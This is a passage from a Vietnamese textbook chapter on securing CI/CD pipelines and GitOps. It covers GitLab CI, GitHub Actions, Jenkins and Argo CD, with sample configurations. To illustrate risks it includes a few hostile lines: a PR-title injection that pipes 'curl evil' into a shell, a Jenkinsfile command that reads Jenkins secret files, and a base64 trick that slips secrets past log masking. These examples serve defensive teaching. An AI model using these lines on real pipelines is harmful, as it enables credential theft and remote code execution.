# Chương 7 — CI/CD & GitOps

## Tổng quan

Pipeline là thứ ít người coi là "hệ thống production", nhưng nó giữ secret của toàn bộ hạ tầng và chạy với đặc quyền cao — chiếm được pipeline gần như tương đương chiếm được mọi thứ nó chạm tới. Chương này đi qua chuỗi tự động đưa code từ commit của lập trình viên tới lúc chạy thật, và cách giữ cho chính chuỗi đó không trở thành đường tấn công.

Mở đầu là các khái niệm nền: **CI** ghép và kiểm tra mọi commit để bắt regression sớm, **CD** đưa artifact đã qua kiểm tra ra môi trường đích (*Delivery* có cổng phê duyệt thủ công trước production, *Deployment* thì không), và **Pipeline as Code** đưa toàn bộ định nghĩa pipeline vào repo dưới dạng file — nhờ đó cấu hình nhạy cảm được review và truy vết như mọi thay đổi code khác, thay vì là thiết lập ẩn ai đó click trên giao diện.

Ba engine được mổ xẻ kèm điểm yếu đặc trưng của từng cái: **GitLab CI** (`.gitlab-ci.yml`, runner/executor — rủi ro nằm ở masked/protected variable và lựa chọn executor), **GitHub Actions** (workflow/job/step, hỗ trợ OIDC — nhưng action bên thứ ba là bề mặt chuỗi cung ứng, và nhầm `pull_request` với `pull_request_target` là kiểu rò secret phổ biến nhất), và **Jenkins** (controller/agent, `Jenkinsfile` — linh hoạt và chạy được on-prem, đổi lại hàng nghìn plugin là bề mặt tấn công). Tiếp đó là **GitOps** với **Argo CD**, nơi mô hình đảo chiều: thay vì CI cầm credential đẩy vào cluster, agent trong cluster tự kéo trạng thái từ Git — credential không rời cluster, và self-heal khôi phục cả những thay đổi trái phép làm tay. **Git submodule** xuất hiện như cách chia sẻ template CI/CD giữa nhiều project với commit SHA được pin cứng.

Mục cuối (7.8) quay lại chính chủ đề mở đầu: bảo vệ pipeline. Secret ở vault chứ không in ra log, ký và verify artifact, khóa quyền sửa pipeline — cộng với hai công cụ mà tự động hóa không thay thế được: PR security checklist và Definition of Done có phần bảo mật, vì lỗi logic nghiệp vụ thì chỉ người review mới bắt được.

> Mỗi mục đi theo mạch: là gì → cơ chế bên trong → ví dụ thực tế → lưu ý bảo mật. Con số phiên bản và hành vi công cụ đổi theo thời gian, chỗ nào cần kiểm chứng lại đều có ghi chú.
---

## 7.1. Khái niệm CI/CD, pipeline as code và mô hình dữ liệu nền tảng

### 7.1.1. CI, CD (Delivery) và CD (Deployment) — định nghĩa chính xác

- **CI (Continuous Integration):** mỗi commit/merge request được tự động build và test. Mục tiêu kỹ thuật: phát hiện xung đột tích hợp và regression ở mức commit, giữ nhánh chính (`main`/`master`) luôn ở trạng thái "green" (build + test pass).
- **CD — Continuous Delivery:** mọi artifact đã qua CI luôn ở trạng thái **sẵn sàng release**, nhưng bước đưa lên production cần một **gate thủ công** (manual approval).
- **CD — Continuous Deployment:** không có gate thủ công; mọi commit pass test sẽ tự động lên production.

Sự khác biệt Delivery vs Deployment **chỉ nằm ở một cổng phê duyệt**. Về mặt bảo mật, cổng đó là điểm kiểm soát thay đổi (change control) — nơi gắn các bằng chứng tuân thủ (SoD — Separation of Duties).

### 7.1.2. Các stage điển hình của pipeline

Luồng đi: `source → build → test → sast/sca → package → publish → deploy(staging) → integration test → deploy(prod) → verify`. Ý nghĩa từng stage:

| Stage | Mô tả |
|---|---|
| `source` | Nhận commit hoặc MR |
| `build` | Biên dịch mã nguồn |
| `test` | Chạy unit test / integration test |
| `sast/sca` | Quét mã (SAST) và dependency (SCA) |
| `package` | Đóng gói artifact (image/jar) |
| `publish` | Đẩy artifact lên registry |
| `deploy(staging)` | Triển khai lên môi trường trung gian |
| `integration test` | Kiểm thử end-to-end |
| `deploy(prod)` | Triển khai lên production |
| `verify` | Smoke test sau triển khai |

Mỗi stage là một **ranh giới tin cậy (trust boundary)**: artifact đi qua stage được "thăng cấp" độ tin cậy. Tấn công chuỗi cung ứng (supply chain) nhắm vào việc chèn payload **trước** một stage để được thăng cấp tin cậy mà không qua kiểm soát.

### 7.1.3. Pipeline as Code — vì sao?

Thay vì cấu hình pipeline qua UI (click-ops), toàn bộ định nghĩa pipeline nằm trong file YAML/Groovy **đặt trong chính repository**. Lý do thiết kế:

| Thuộc tính | Vì sao quan trọng (góc nhìn bảo mật/vận hành) |
|---|---|
| Versioned | Pipeline thay đổi → diff được, audit được qua git log |
| Review được | Thay đổi pipeline đi qua code review/MR như mọi code khác |
| Reproducible | Cùng commit → cùng pipeline; không có "config drift" ẩn trong UI |
| Co-located | Pipeline đi cùng code → branch khác nhau có pipeline khác nhau |

**Lưu ý:** vì pipeline-as-code nằm trong repo và thường chạy với quyền cao (truy cập secrets, registry, cluster), bất kỳ ai sửa được file pipeline (qua MR/PR, hoặc commit trực tiếp vào nhánh không bảo vệ) đều có khả năng **thực thi mã tùy ý trong môi trường CI**. Đây là lớp tấn công chính trong toàn chương.

---

## 7.2. GitLab CI — chi tiết

### 7.2.1. Mô hình thực thi và file `.gitlab-ci.yml`

GitLab CI đọc file `.gitlab-ci.yml` ở **gốc repository** (đường dẫn có thể cấu hình lại trong Settings → CI/CD). File này là YAML định nghĩa các **job**. Job được nhóm vào **stage**; các job cùng stage chạy **song song**, các stage chạy **tuần tự**. Một job chỉ chạy khi mọi job ở stage trước thành công (trừ khi dùng `needs` để tạo DAG).

#### Cấu trúc đầy đủ — bảng từng khóa cấp cao nhất (global keywords)

| Khóa | Kiểu | Ý nghĩa | Ví dụ |
|---|---|---|---|
| `stages` | list | Thứ tự các stage | `[build, test, deploy]` |
| `variables` | map | Biến môi trường toàn cục | `DOCKER_DRIVER: overlay2` |
| `default` | map | Cấu hình mặc định cho mọi job (image, before_script...) | `image: alpine:3.20` |
| `workflow` | map | Quy tắc tạo/không tạo pipeline | `rules:` |
| `include` | list/map | Nhập file CI khác (local/remote/template/project) | `- local: ci/sast.yml` |
| `cache` | map | Cache toàn cục | `paths: [node_modules]` |

#### Các khóa cấp job — bảng chi tiết

| Khóa | Ý nghĩa | Ghi chú kỹ thuật |
|---|---|---|
| `stage` | Stage chứa job | Mặc định `test` nếu không khai báo |
| `script` | Lệnh shell chính (bắt buộc) | list of strings; mỗi phần tử là một lệnh |
| `before_script` | Lệnh chạy trước `script` | Gộp chung shell với `script` (cùng process tree) |
| `after_script` | Lệnh chạy sau, **kể cả khi job fail** | Chạy trong shell **tách biệt** — biến từ `script` không còn |
| `rules` | Điều kiện chạy/biến/khi nào allow_failure | Thay thế hiện đại cho `only/except` |
| `only` / `except` | Điều kiện chạy (cũ) | Vẫn dùng được nhưng không trộn với `rules` trong cùng job |
| `artifacts` | File/đường dẫn lưu lại sau job | Truyền giữa stage; có `expire_in`, `reports` |
| `cache` | Thư mục cache giữa các lần chạy | Khác artifacts: cache tăng tốc, không đảm bảo tồn tại |
| `needs` | Tạo DAG, chạy job không chờ hết stage trước | Giới hạn số phần tử tùy version |
| `services` | Container phụ chạy cùng job (DB, docker:dind) | Network chung với job |
| `tags` | Chọn runner theo tag | Khớp với tag đăng ký của runner |
| `environment` | Gắn job với environment (deploy) | Hiện trên UI, hỗ trợ rollback |
| `when` | `on_success`/`on_failure`/`always`/`manual`/`delayed` | `manual` tạo job bấm tay |
| `allow_failure` | Job fail không làm fail pipeline | Mặc định true cho `when: manual` |
| `retry` | Số lần thử lại | Có thể lọc theo loại lỗi |
| `timeout` | Giới hạn thời gian job | Ghi đè timeout project |
| `dependencies` | Chọn artifacts của job nào để tải về | Rỗng `[]` = không tải artifact nào |

### 7.2.2. `rules` — cơ chế đánh giá từng bước

`rules` là **danh sách có thứ tự**. GitLab duyệt từ trên xuống, **dừng ở rule đầu tiên khớp**, rồi áp dụng `when`/`variables`/`allow_failure` của rule đó. Nếu không rule nào khớp → job **không được thêm** vào pipeline.

Mỗi rule có thể dùng:
- `if:` — biểu thức trên biến CI (so sánh `==`, `!=`, `=~` regex, `&&`, `||`).
- `changes:` — danh sách glob path; khớp nếu commit thay đổi các file đó.
- `exists:` — file tồn tại trong repo.

```yaml
test-job:
  stage: test
  script: ["pytest -q"]
  rules:
    # Rule 1: MR nhắm vào main → chạy, không cho phép fail
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event" && $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == "main"'
      when: on_success
      allow_failure: false
    # Rule 2: chỉ chạy khi đổi file Python
    - if: '$CI_COMMIT_BRANCH'
      changes: ["**/*.py"]
    # Rule 3: ngược lại không thêm job (ngầm định khi hết list)
```

**Vì sao thiết kế "dừng ở match đầu tiên":** giống một bộ lọc ACL — thứ tự quan trọng, rule cụ thể đặt trên, rule tổng quát đặt dưới.

### 7.2.3. Biến CI/CD predefined quan trọng

| Biến | Ý nghĩa | Ví dụ giá trị |
|---|---|---|
| `CI_PIPELINE_SOURCE` | Nguồn kích hoạt | `push`, `merge_request_event`, `schedule`, `web`, `trigger` |
| `CI_COMMIT_SHA` | SHA commit đầy đủ (40 hex = 160 bit SHA-1) | `9b2c...` |
| `CI_COMMIT_REF_NAME` | Tên branch/tag | `main` |
| `CI_JOB_TOKEN` | Token tạm thời, sống trong vòng đời job | (ẩn) |
| `CI_REGISTRY` / `CI_REGISTRY_IMAGE` | Registry tích hợp | `registry.gitlab.com/group/proj` |
| `CI_PROJECT_DIR` | Thư mục checkout | `/builds/group/proj` |
| `CI_DEFAULT_BRANCH` | Branch mặc định | `main` |

`CI_JOB_TOKEN` đáng chú ý về bảo mật: nó cho phép job truy cập một số API GitLab và pull/push registry của chính project. Phạm vi của nó cấu hình được trong **CI/CD → Token Access**; cấu hình quá rộng cho phép project A đọc project B.

### 7.2.4. Runner và Executor — chi tiết luồng đăng ký

**Runner** là một agent (binary `gitlab-runner`, viết bằng Go) đăng ký với GitLab. Khi có job, GitLab giao job cho runner có tag phù hợp. Runner dùng một **executor** để thực thi.

| Executor | Cách chạy job | Cách ly | Dùng khi |
|---|---|---|---|
| `shell` | Chạy trực tiếp trên host của runner | **Không** (chia sẻ FS, user) | Lab nhỏ; rủi ro cao |
| `docker` | Mỗi job trong một container mới từ `image:` | Container-level | Phổ biến nhất |
| `docker+machine` | Spin VM theo nhu cầu | VM-level | Autoscale |
| `kubernetes` | Mỗi job là một Pod | Pod/namespace | Cluster lớn |

**Luồng đăng ký runner (registration), từng bước:**

```
1. Admin tạo runner trong UI → GitLab sinh "runner authentication token" (prefix glrt-)
2. Trên máy runner: gitlab-runner register --url https://gitlab.example.com --token glrt-xxxx
3. Runner gọi POST /api/v4/runners/verify với token → GitLab xác nhận
4. Cấu hình ghi vào /etc/gitlab-runner/config.toml
5. gitlab-runner run: long-poll POST /api/v4/jobs/request mỗi vài giây
6. Khi có job → GitLab trả JSON job (script, variables, dependencies, artifacts URL)
7. Runner thực thi qua executor, stream log (PATCH /api/v4/jobs/:id/trace), trả trạng thái
```

`config.toml` mẫu (executor docker):

```toml
concurrent = 4
check_interval = 3

[[runners]]
  name = "docker-runner-01"
  url = "https://gitlab.example.com"
  token = "glrt-REDACTED"
  executor = "docker"
  [runners.docker]
    image = "alpine:3.20"
    privileged = false          # Lưu ý: privileged=true ⇒ dễ thoát container ra host
    volumes = ["/cache"]
    pull_policy = ["if-not-present"]
```

**Lưu ý bảo mật runner:**
- `privileged = true` (thường bật để chạy Docker-in-Docker) cho phép job thoát ra host. Tách runner privileged sang môi trường cách ly.
- `shell` executor + runner shared = một MR độc hại chạy lệnh trên host runner. Không bao giờ dùng shell executor cho repo public/untrusted.
- Mount `/var/run/docker.sock` vào job = trao quyền root host. Tránh tuyệt đối với runner shared.

### 7.2.5. Biến masked và protected — cơ chế chính xác

Trong **Settings → CI/CD → Variables**:

- **Masked:** GitLab thay thế giá trị bằng `[MASKED]` trong **log**. Ràng buộc kỹ thuật để mask được: giá trị phải là một dòng, độ dài tối thiểu (mặc định 8 ký tự), và chỉ chứa tập ký tự được phép (kiểm chứng theo version). Masking **chỉ che log**, không chống được nếu job in `echo $VAR | base64` (đã biến đổi → không khớp pattern mask).
- **Protected:** biến chỉ được tiêm vào job chạy trên **branch/tag protected**. Mục đích: ngăn MR từ branch thường (do attacker tạo) đọc secret production.

```yaml
deploy-prod:
  stage: deploy
  environment: production
  script:
    - echo "Deploying with token..."
    - curl -H "PRIVATE-TOKEN: $PROD_DEPLOY_TOKEN" "$DEPLOY_API"
  rules:
    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'   # main là protected
```
`$PROD_DEPLOY_TOKEN` được đánh dấu Protected + Masked → MR từ `feature/x` không nhận được biến này.

**Lỗ hổng kinh điển:** biến protected nhưng branch không được set protected trong **Settings → Repository → Protected branches** ⇒ bảo vệ vô hiệu. Hai cấu hình phải khớp nhau.

### 7.2.6. `artifacts` vs `cache`

| | `artifacts` | `cache` |
|---|---|---|
| Mục đích | Truyền output giữa stage, tải về | Tăng tốc (reuse dependency) |
| Đảm bảo tồn tại | Có (trong vòng đời pipeline) | Không (best-effort) |
| Key | Theo job | `cache:key` (vd theo `$CI_COMMIT_REF_SLUG`) |
| Lưu | GitLab object storage | Object storage / local runner |

```yaml
build:
  stage: build
  script: ["npm ci", "npm run build"]
  cache:
    key: "$CI_COMMIT_REF_SLUG"
    paths: ["node_modules/"]
  artifacts:
    paths: ["dist/"]
    expire_in: 1 week
    reports:
      sast: gl-sast-report.json   # report đặc biệt → hiện trên Security Dashboard
```

**Bảo mật:** `artifacts` có thể vô tình đóng gói secret (vd file `.env`, `kubeconfig`). Cache poisoning: nếu cache key trùng giữa branch tin cậy và không tin cậy, attacker đầu độc `node_modules` cache rồi branch tin cậy dùng lại. Tách cache key theo ref.

### 7.2.7. Ví dụ pipeline thật: test + SAST + deploy

```yaml
stages: [build, test, security, package, deploy]

default:
  image: node:20-alpine

variables:
  IMAGE: "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA"

# SAST + Dependency scanning dùng template chính thức của GitLab
include:
  - template: Security/SAST.gitlab-ci.yml
  - template: Security/Dependency-Scanning.gitlab-ci.yml

build:
  stage: build
  script: ["npm ci", "npm run build"]
  artifacts: { paths: ["dist/"], expire_in: 1h }

unit-test:
  stage: test
  script: ["npm test -- --ci --reporters=default --reporters=jest-junit"]
  artifacts:
    reports: { junit: junit.xml }

container-build:
  stage: package
  image: docker:27
  services: ["docker:27-dind"]
  variables: { DOCKER_TLS_CERTDIR: "/certs" }
  script:
    - docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" "$CI_REGISTRY"
    - docker build -t "$IMAGE" .
    - docker push "$IMAGE"
  rules:
    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'

deploy-staging:
  stage: deploy
  image: bitnami/kubectl:1.30
  environment: { name: staging, url: https://staging.example.com }
  script:
    - kubectl set image deployment/app app="$IMAGE" -n staging
  rules:
    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'

deploy-prod:
  stage: deploy
  image: bitnami/kubectl:1.30
  environment: { name: production, url: https://app.example.com }
  when: manual                       # gate Continuous Delivery
  script:
    - kubectl set image deployment/app app="$IMAGE" -n production
  rules:
    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'
```

Output mẫu (trace log job `unit-test`, rút gọn):

```
Running with gitlab-runner 17.x (docker)
Preparing the "docker" executor
Using docker image node:20-alpine ...
$ npm test -- --ci ...
PASS  src/app.test.js
Test Suites: 12 passed, 12 total
Tests:       48 passed, 48 total
Uploading artifacts for successful job
  junit.xml: found 1 matching artifact files
Job succeeded
```

---

## 7.3. GitHub Actions

### 7.3.1. Mô hình: workflow → job → step

File workflow nằm trong `.github/workflows/*.yml`. Một **workflow** chứa nhiều **job**; mỗi job chạy trên một **runner** (VM/container); mỗi job có nhiều **step**; step hoặc chạy `run:` (shell) hoặc `uses:` (một **action** tái sử dụng).

| Cấp | Khóa chính | Ghi chú |
|---|---|---|
| Workflow | `name`, `on`, `permissions`, `env`, `concurrency`, `jobs` | `on` định nghĩa trigger |
| Job | `runs-on`, `needs`, `if`, `strategy`, `permissions`, `steps`, `environment`, `outputs` | `needs` tạo phụ thuộc |
| Step | `uses`, `with`, `run`, `env`, `id`, `if` | `with` truyền input cho action |

### 7.3.2. `on` — trigger chi tiết

```yaml
on:
  push:
    branches: ["main"]
    paths: ["src/**"]
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:          # bấm tay
    inputs:
      environment:
        type: choice
        options: [staging, production]
  schedule:
    - cron: "0 2 * * *"       # 02:00 UTC mỗi ngày
```

**Khác biệt bảo mật cực kỳ quan trọng — `pull_request` vs `pull_request_target`:**

| Trigger | Code chạy | Secrets có sẵn | `GITHUB_TOKEN` |
|---|---|---|---|
| `pull_request` | Code của **PR** (fork) | **Không** (mặc định) | Read-only mặc định |
| `pull_request_target` | Workflow của **base branch** | **Có** | Read/write |

`pull_request_target` chạy trong ngữ cảnh repo gốc **với secrets**, nhưng nếu nó checkout và thực thi code của PR (`ref: ${{ github.event.pull_request.head.sha }}`) thì attacker từ fork đọc được mọi secret. Đây là lỗ hổng phổ biến nhất trong GitHub Actions.

### 7.3.3. `GITHUB_TOKEN` và `permissions`

Mỗi run nhận một `GITHUB_TOKEN` tạm thời (hết hạn khi job xong). Phạm vi của nó điều khiển bằng `permissions`:

```yaml
permissions:
  contents: read        # mặc định nên là read
  packages: write       # cần để push GHCR
  id-token: write       # BẮT BUỘC cho OIDC
```

Nguyên tắc least privilege: đặt `permissions: { contents: read }` ở cấp workflow, nâng quyền cụ thể chỉ ở job cần.

### 7.3.4. Secrets, masking và OIDC

- **Secrets** (`${{ secrets.NAME }}`): lưu mã hóa, tự động masked trong log (thay bằng `***`). Như GitLab, masking chỉ che giá trị nguyên văn — biến đổi qua base64/cắt chuỗi sẽ lộ.
- **OIDC (OpenID Connect):** thay vì lưu credential cloud tĩnh, runner xin một **JWT ngắn hạn** từ GitHub, cloud (AWS/GCP/Azure) tin GitHub làm IdP và đổi JWT lấy credential tạm.

Cấu trúc JWT OIDC của GitHub (JWT = 3 phần Base64URL ngăn bởi `.`):

```
header.payload.signature
```

| Phần | Nội dung | Ví dụ field |
|---|---|---|
| Header | `{"alg":"RS256","kid":"...","typ":"JWT"}` | thuật toán ký RSA-256 |
| Payload | claims | `iss`, `sub`, `aud`, `exp`, `repository`, `ref` |
| Signature | RSASSA-PKCS1-v1_5 trên SHA-256 | 256 byte với khóa RSA-2048 |

Claim `sub` (subject) là cốt lõi của trust policy. Ví dụ:

```
sub = repo:my-org/my-repo:ref:refs/heads/main
iss = https://token.actions.githubusercontent.com
aud = sts.amazonaws.com
```

Trust policy AWS phải khóa chặt `sub`:

```json
{
  "Effect": "Allow",
  "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"},
    "StringLike": {"token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"}
  }
}
```

**Lỗ hổng:** dùng `StringLike` với `repo:my-org/*:*` cho phép **bất kỳ branch/PR nào** của org assume role. Phải pin `ref` hoặc dùng `environment`.

### 7.3.5. `uses` và pinning action

`uses: actions/checkout@v4` tham chiếu action. Tham chiếu có thể là tag (`@v4`), branch (`@main`), hoặc **commit SHA** (`@8f4b...`).

| Cách pin | Ổn định | An toàn |
|---|---|---|
| `@main` | Thấp | Thấp — owner đẩy commit mới = chạy code mới |
| `@v4` (tag) | Trung bình | Trung bình — tag có thể bị move |
| `@<full-40-hex-SHA>` | Cao | Cao — SHA bất biến |

**Khuyến nghị bảo mật:** pin action third-party theo **full SHA-1 40 ký tự** (160 bit), kèm comment tag để đọc:

```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```

### 7.3.6. Ví dụ workflow thật: matrix test + SAST + build + OIDC deploy

```yaml
name: ci
on:
  pull_request:
  push: { branches: [main] }

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        node: [20, 22, 24]   # Node 18 đã EOL — pin theo các bản còn hỗ trợ (cần kiểm chứng)
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a  # v4.2.0
        with: { node-version: "${{ matrix.node }}" }
      - run: npm ci
      - run: npm test

  codeql:
    runs-on: ubuntu-latest
    permissions: { security-events: write, contents: read }
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - uses: github/codeql-action/init@v3
        with: { languages: javascript }
      - uses: github/codeql-action/analyze@v3

  deploy:
    needs: [test, codeql]
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write        # OIDC
      contents: read
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
          aws-region: ap-southeast-1
      - run: aws s3 sync ./dist s3://my-bucket --delete
```

**Marketplace action** (`aws-actions/configure-aws-credentials`): nhận `role-to-assume`, gọi `sts:AssumeRoleWithWebIdentity` bằng JWT OIDC lấy từ `id-token: write`, set biến môi trường `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY`/`AWS_SESSION_TOKEN` cho các step sau.

### 7.3.7. Lưu ý bảo mật GitHub Actions tổng hợp

- **Script injection qua context:** `run: echo "${{ github.event.pull_request.title }}"` — nếu title chứa `"; curl evil | sh` thì lệnh được nội suy **trước** khi shell chạy → RCE. Cách an toàn: đưa vào biến môi trường rồi tham chiếu `"$TITLE"`.
- Tắt `Allow all actions` ở org; whitelist action theo verified creator + SHA.
- Đặt mặc định `permissions` tối thiểu ở cấp org/repo.

---

## 7.4. Jenkins

### 7.4.1. Kiến trúc controller/agent

- **Controller** (trước gọi "master"): web UI, scheduler, lưu config, điều phối build. Nên **không** chạy build trên controller (build executors = 0) để tránh code build truy cập filesystem controller.
- **Agent** (trước "slave"): node thực thi build. Kết nối qua **SSH**, **JNLP/inbound (TCP)**, hoặc agent động (Kubernetes/Docker plugin).

```
   Developer ──push──> SCM (Git)
        │ webhook
        ▼
  ┌───────────────┐   giao build    ┌──────────┐
  │  Controller   │ ───────────────>│ Agent A  │ (linux, label: docker)
  │  (UI, queue)  │ <──── log ──────│ Agent B  │ (windows)
  └───────────────┘                 └──────────┘
```

Giao thức inbound agent (JNLP) bắt tay qua cổng TCP cấu hình. Agent xác thực bằng **secret** do controller cấp. **Lưu ý:** mở cổng agent ra Internet + secret yếu = nguy cơ RCE trên controller.

### 7.4.2. Jenkinsfile declarative vs scripted

Jenkins Pipeline dùng Groovy DSL. Hai phong cách:

- **Declarative:** cấu trúc cố định (`pipeline { agent ... stages ... }`), validate được, dễ đọc. Khuyến nghị.
- **Scripted:** Groovy thuần (`node { ... }`), linh hoạt nhưng dễ sai và khó audit.

#### Declarative — khối chính

| Khối | Bắt buộc | Ý nghĩa |
|---|---|---|
| `pipeline` | Có | Bao ngoài cùng |
| `agent` | Có | Node/label/docker chạy pipeline |
| `stages` → `stage` → `steps` | Có | Đơn vị công việc |
| `environment` | Không | Biến môi trường (có thể đọc credentials) |
| `options` | Không | timeout, retry, buildDiscarder |
| `parameters` | Không | Input khi trigger |
| `when` | Không | Điều kiện chạy stage |
| `post` | Không | Hành động sau (`always`, `success`, `failure`, `unstable`) |

#### Scripted — ví dụ tối giản

```groovy
node('docker') {
    stage('Build') { sh 'npm ci && npm run build' }
    stage('Test')  { sh 'npm test' }
}
```

### 7.4.3. Credentials — cơ chế

Jenkins **Credentials** lưu secret mã hóa, tham chiếu bằng ID. Trong pipeline dùng `credentials()` hoặc `withCredentials`:

```groovy
environment {
    AWS_CRED = credentials('aws-deploy')   // tạo AWS_CRED_USR và AWS_CRED_PSW
}
```

Hoặc binding tường minh:

```groovy
withCredentials([string(credentialsId: 'prod-token', variable: 'TOKEN')]) {
    sh 'curl -H "Authorization: Bearer $TOKEN" https://api.example.com/deploy'
}
```

Jenkins tự động **mask** giá trị credential trong console log. Nhưng giống các hệ khác, biến đổi giá trị (in từng phần) làm lộ. Lưu ý: tránh dùng `sh "echo ${TOKEN}"` (Groovy interpolation, nội suy ngoài shell, dễ lộ + injection) — dùng `sh 'echo $TOKEN'` (single quote, shell tự đọc env).

### 7.4.4. Ví dụ Jenkinsfile thật (declarative)

```groovy
pipeline {
    agent { label 'docker' }

    options {
        timeout(time: 30, unit: 'MINUTES')
        buildDiscarder(logRotator(numToKeepStr: '20'))
        disableConcurrentBuilds()
    }

    environment {
        IMAGE      = "registry.example.com/app:${env.GIT_COMMIT.take(8)}"
        REGISTRY   = credentials('registry-creds')   // REGISTRY_USR / REGISTRY_PSW
    }

    stages {
        stage('Build') {
            steps { sh 'npm ci && npm run build' }
        }

        stage('Test') {
            steps { sh 'npm test -- --ci' }
            post { always { junit 'junit.xml' } }
        }

        stage('SAST') {
            steps {
                sh 'docker run --rm -v "$PWD:/src" semgrep/semgrep semgrep --config=auto --error /src'   // image chính thức (org đổi tên từ returntocorp)
            }
        }

        stage('Package & Push') {
            when { branch 'main' }
            steps {
                sh 'echo "$REGISTRY_PSW" | docker login registry.example.com -u "$REGISTRY_USR" --password-stdin'
                sh 'docker build -t "$IMAGE" .'
                sh 'docker push "$IMAGE"'
            }
        }

        stage('Deploy Prod') {
            when { branch 'main' }
            steps {
                input message: 'Deploy to production?', ok: 'Deploy'   // gate thủ công
                sh 'kubectl set image deployment/app app="$IMAGE" -n production'
            }
        }
    }

    post {
        failure { echo 'Build failed — gửi cảnh báo' }
        always  { cleanWs() }
    }
}
```

Output mẫu (console, rút gọn):

```
[Pipeline] stage (Test)
+ npm test -- --ci
Tests: 48 passed
[Pipeline] junit
Recording test results
[Pipeline] stage (Deploy Prod)
Input requested: Deploy to production? -> (Proceed / Abort)
```

### 7.4.5. Plugin và bề mặt tấn công

Jenkins là plugin-driven (hàng nghìn plugin). Mỗi plugin là một bề mặt tấn công. Các vấn đề kinh điển:
- **Script Security / Groovy sandbox:** pipeline Groovy chạy trong sandbox; method ngoài whitelist cần admin approve (Manage Jenkins → In-process Script Approval). Bỏ qua sandbox = RCE.
- **CVE plugin:** cập nhật trễ → lỗ hổng đã công bố bị khai thác.
- **Build executor trên controller:** nếu để > 0, một Jenkinsfile độc hại `sh 'cat $JENKINS_HOME/secrets/*'` trộm key giải mã credentials.

**Phòng thủ:** controller executors = 0, agent ephemeral (K8s pod mỗi build), bật CSRF protection, cập nhật plugin, RBAC qua Matrix/Role Strategy plugin, audit qua Audit Trail plugin.

---

## 7.5. Argo CD & GitOps

### 7.5.1. Nguyên lý: Git là single source of truth

GitOps đảo ngược mô hình "CI push tới cluster". Thay vào đó:
1. Trạng thái mong muốn (desired state) của hệ thống được khai báo **declarative** trong Git (manifest K8s, Helm, Kustomize).
2. Một **agent trong cluster** (Argo CD) liên tục so sánh **desired state (Git)** với **live state (cluster)** và **reconcile** (đồng bộ) để khớp.

| Tiêu chí | CI-push (kubectl từ pipeline) | GitOps (pull, Argo CD) |
|---|---|---|
| Ai chạm cluster | Pipeline (cần credential cluster đặt ở CI) | Agent trong cluster (credential không rời cluster) |
| Single source of truth | Trạng thái thực tế cluster | Git |
| Drift detection | Không | Có (live vs desired) |
| Credential cluster | Lưu ở CI (rủi ro) | Không cần export ra ngoài |
| Audit | Log pipeline | Git history (mọi thay đổi = commit) |
| Rollback | Chạy lại pipeline | `git revert` |

**Vì sao GitOps an toàn hơn về credential:** trong CI-push, kubeconfig/admin token nằm trong secret CI — bề mặt tấn công lớn (mọi job có thể lạm dụng). Trong GitOps, Argo CD trong cluster tự kéo và áp manifest; không cần credential cluster rời khỏi cluster.

### 7.5.2. Reconcile loop — state machine chi tiết

```
        ┌──────────────────────────────────────────────────┐
        │                  RECONCILE LOOP                    │
        │  (mặc định mỗi ~180s + webhook + manual sync)      │
        └──────────────────────────────────────────────────┘
   1. Lấy desired state: clone/pull repo @ targetRevision
   2. Render manifest (Helm template / Kustomize build / plain)
   3. Lấy live state: query Kubernetes API các resource
   4. Diff desired vs live (normalize: bỏ field do cluster sinh)
   5. Tính SYNC STATUS:
        - Synced      : desired == live
        - OutOfSync   : khác nhau (drift hoặc commit mới)
   6. Tính HEALTH STATUS (per resource):
        Healthy / Progressing / Degraded / Suspended / Missing
   7. Nếu OutOfSync và auto-sync bật → apply (server-side apply)
   8. Nếu selfHeal bật và drift thủ công → ghi đè về desired
```

Hai trục trạng thái **độc lập**:
- **Sync status:** Git có khớp cluster không.
- **Health status:** resource có hoạt động tốt không (vd Deployment đủ replica ready).

### 7.5.3. Application CRD — từng field

Argo CD định nghĩa một **Application** (CRD `argoproj.io/v1alpha1`):

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: my-app
  namespace: argocd
  finalizers:
    - resources-finalizer.argocd.argoproj.io   # cascade xóa resource khi xóa App
spec:
  project: default
  source:
    repoURL: https://github.com/my-org/k8s-manifests.git
    targetRevision: main          # branch/tag/commit
    path: apps/my-app/overlays/prod
    # helm: { valueFiles: [values-prod.yaml] }   # nếu Helm
  destination:
    server: https://kubernetes.default.svc       # cluster đích
    namespace: my-app
  syncPolicy:
    automated:
      prune: true                 # xóa resource không còn trong Git
      selfHeal: true              # ghi đè drift thủ công
      allowEmpty: false
    syncOptions:
      - CreateNamespace=true
      - ServerSideApply=true
    retry:
      limit: 5
      backoff: { duration: 5s, factor: 2, maxDuration: 3m }
```

| Field | Ý nghĩa | Ghi chú bảo mật |
|---|---|---|
